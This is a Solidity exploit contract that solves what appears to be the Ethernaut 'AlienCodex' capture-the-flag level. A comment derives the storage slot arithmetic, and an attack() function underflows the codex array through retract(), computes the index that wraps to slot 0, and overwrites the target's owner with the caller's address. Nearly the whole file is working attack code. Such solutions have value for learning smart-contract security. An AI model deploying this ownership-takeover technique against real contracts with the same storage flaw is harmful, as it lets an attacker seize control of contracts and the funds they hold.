// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IAlienCodex {
    function owner() external view returns(address);
    function makeContact() external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;
}

/*
storage layout 
slot 0 = owner(20 bytes), contact (1 bytes)
slot 1 = codex

h = keccak256(1)
slot h = codex[0]
slot h + 1 = codex[1]
slot h + 2 = codex[2]
slot h + 3 = codex[3]

slot h + 2 ** 256 - 1 = codex[2 ** 256 - 1] 
Find i such that
slot h + i = slot 0
h + i = 0 so i = 0 - h
*/

contract MyContract {
    IAlienCodex target;
    constructor(address _target) {
        target = IAlienCodex(_target);
    }

    function  attack() public {
        target.makeContact();
        target.retract();

        uint256 h = uint256(keccak256(abi.encode(uint256(1))));
        uint i;
        unchecked {
            i -= h;
        }

        target.revise(i, bytes32(uint256(uint160(msg.sender))));
        require(target.owner() == msg.sender,"Failed");

    }
}
